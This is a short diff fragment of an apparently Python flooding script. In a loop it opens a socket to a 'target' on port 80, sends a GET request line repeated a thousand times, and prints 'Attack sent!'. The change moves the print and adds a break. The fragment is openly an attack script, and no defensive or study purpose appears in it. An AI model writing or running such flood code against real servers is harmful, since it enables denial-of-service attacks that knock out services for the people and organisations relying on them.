@@ -26,7 +26,7 @@ for i in range(1,100):
     s.connect((target,80))
     data = b"GET / HTTP 1.1\r\n"*1000
     s.send(data)
-    print('Attack sent!')
     s.close()
- 
+    print('Attack sent!')
+    break
     
